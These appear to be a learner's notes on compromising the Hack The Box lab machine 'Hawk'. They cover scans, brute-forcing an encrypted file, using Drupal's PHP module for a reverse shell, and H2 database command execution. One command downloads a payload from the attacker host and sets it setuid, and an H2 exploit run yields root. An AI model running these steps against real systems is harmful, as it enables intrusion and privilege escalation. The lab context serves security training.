nmap
```
┌──(kali㉿kali)-[~/HTB/hawk]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.95.193 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 22:41 EST
Warning: 10.129.95.193 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.95.193
Host is up (0.045s latency).
Not shown: 64504 closed tcp ports (reset), 1025 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.95%I=7%D=1/16%Time=6789D1E5%P=x86_64-pc-linux-gnu%r(NU
SF:LL,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\
SF:0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i
SF:\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0
SF:l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\
SF:0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0h\x002
SF:\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:
SF:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0
SF:t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\
SF:0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A
SF:\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x0
SF:01\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\
SF:0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\
SF:0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0
SF:o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g
SF:\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0
SF::\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e
SF:\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0
SF:D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005\0\)\0
SF:\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t
SF:\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x20\0o\
SF:0r")%r(HTTPOptions,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0
SF:\0F\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0
SF:o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\
SF:0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l
SF:\0l\0o\0w\0O\0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0
SF:r\0g\0\.\0h\x002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0
SF:p\0t\0i\0o\0n\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\
SF:0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a
SF:\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x2
SF:0\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001
SF:\x001\x007\0-\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x0
SF:02\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g
SF:\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\
SF:0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0
SF:t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0
SF:c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0
SF:\.\0j\0a\0v\0a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0
SF:h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\
SF:.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001
SF:\x005\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s
SF:\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0
SF:E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t
SF:\0a\0t\0\x20\0o\0r");
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   44.97 ms 10.10.14.1
2   45.44 ms 10.129.95.193

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.59 seconds
```

```
┌──(kali㉿kali)-[~/HTB/hawk]
└─$ dirsearch -u http://10.129.95.193/ -x 400-500
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/hawk/reports/http_10.129.95.193/__25-01-16_22-54-11.txt

Target: http://10.129.95.193/

[22:54:11] Starting: 
[22:55:35] 200 -   32KB - /CHANGELOG                                        
[22:55:36] 200 -   32KB - /CHANGELOG.txt                                    
[22:55:41] 200 -  769B  - /COPYRIGHT.txt                                    
[22:56:11] 301 -  317B  - /includes  ->  http://10.129.95.193/includes/     
[22:56:14] 200 -    1KB - /install.php                                      
[22:56:15] 200 -  842B  - /INSTALL.pgsql.txt                                
[22:56:15] 200 -  868B  - /INSTALL.mysql.txt                                
[22:56:15] 200 -    1KB - /install.php?profile=default
[22:56:16] 200 -    6KB - /INSTALL                                          
[22:56:17] 200 -    6KB - /INSTALL.txt                                      
[22:56:27] 200 -    7KB - /LICENSE                                          
[22:56:27] 200 -    7KB - /LICENSE.txt
[22:56:37] 200 -    2KB - /MAINTAINERS.txt                                  
[22:56:41] 301 -  313B  - /misc  ->  http://10.129.95.193/misc/             
[22:56:43] 301 -  316B  - /modules  ->  http://10.129.95.193/modules/       
[22:57:13] 301 -  317B  - /profiles  ->  http://10.129.95.193/profiles/     
[22:57:17] 200 -    2KB - /README                                           
[22:57:18] 200 -    2KB - /README.txt                                       
[22:57:22] 200 -  744B  - /robots.txt                                       
[22:57:23] 301 -  316B  - /scripts  ->  http://10.129.95.193/scripts/       
[22:57:32] 301 -  314B  - /sites  ->  http://10.129.95.193/sites/           
[22:57:32] 200 -    0B  - /sites/example.sites.php
[22:57:32] 200 -  715B  - /sites/all/modules/README.txt
[22:57:32] 200 -  129B  - /sites/all/libraries/README.txt                   
[22:57:32] 200 -  431B  - /sites/README.txt                                 
[22:57:32] 200 -  545B  - /sites/all/themes/README.txt
[22:57:48] 301 -  315B  - /themes  ->  http://10.129.95.193/themes/         
[22:57:54] 200 -    3KB - /UPGRADE                                          
[22:57:54] 200 -    3KB - /UPGRADE.txt
[22:57:56] 200 -    2KB - /user                                             
[22:57:56] 200 -    2KB - /user/                                            
[22:57:57] 200 -    2KB - /user/login/                                      
[22:58:09] 200 -    2KB - /web.config                                       
[22:58:19] 200 -   42B  - /xmlrpc.php                                       
                                                                             
Task Completed  
```

![Pasted image 20250117115001](<0. Attachments/Pasted image 20250117115001.png>)

![Pasted image 20250117115648](<0. Attachments/Pasted image 20250117115648.png>)

from ftp server
![Pasted image 20250117114851](<0. Attachments/Pasted image 20250117114851.png>)

![Pasted image 20250117120956](<0. Attachments/Pasted image 20250117120956.png>)

to decode it
```
cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [ $? -eq 0 ](%20$?%20-eq%200%20); then echo "Password: $pass" > pass; exit; fi; done;
```

for some reason my terminal dies
```
┌──(kali㉿kali)-[~/HTB/hawk]
└─$ cat pass          
Password: friends
```
![Pasted image 20250117121415](<0. Attachments/Pasted image 20250117121415.png>)

alternatively we can use this tool as well - https://github.com/HrushikeshK/openssl-bruteforce

logged in as admin
![Pasted image 20250117121752](<0. Attachments/Pasted image 20250117121752.png>)

modules --> allowing php --> save config
![Pasted image 20250117121921](<0. Attachments/Pasted image 20250117121921.png>)

now to create one i go to content --> add content --> article
![Pasted image 20250117122349](<0. Attachments/Pasted image 20250117122349.png>)
![Pasted image 20250117122414](<0. Attachments/Pasted image 20250117122414.png>)

now to get a revshell
![Pasted image 20250117122528](<0. Attachments/Pasted image 20250117122528.png>)

![Pasted image 20250117122624](<0. Attachments/Pasted image 20250117122624.png>)

priv esc
since there is a db of some kind lets check
```
cat /var/www/html/sites/default/settings.php
```

![Pasted image 20250117122828](<0. Attachments/Pasted image 20250117122828.png>)
password - drupal4hawk

but it drops us into python so to get a shell
```
import pty;pty.spawn('/bin/bash')
```

![Pasted image 20250117123336](<0. Attachments/Pasted image 20250117123336.png>)

tunneling 
![Pasted image 20250117123704](<0. Attachments/Pasted image 20250117123704.png>)

![Pasted image 20250117124546](<0. Attachments/Pasted image 20250117124546.png>)

 first we create a shellexec
```
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;
```

![Pasted image 20250117125527](<0. Attachments/Pasted image 20250117125527.png>)

creating code to run a shell
![Pasted image 20250117125901](<0. Attachments/Pasted image 20250117125901.png>)

![Pasted image 20250117130154](<0. Attachments/Pasted image 20250117130154.png>)
```
CALL SHELLEXEC('wget -O /home/daniel/.a http://10.10.14.4:81/shell');
CALL SHELLEXEC('chmod 4775 /home/daniel/.a');
```
unable to get a reverse shell

did this instead
![Pasted image 20250117131126](<0. Attachments/Pasted image 20250117131126.png>)

https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed
found this exploit may be usefull
```
python3 h2-exploit.py -H 127.0.0.1:8082  -d jdbc:h2:~/emptydb-7yfXg
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ id
uid=0(root) gid=0(root) groups=0(root)
```

it works but is it a reverse shell idk. I think a possible way to create a revshell is to create a proper tunnel. but idk.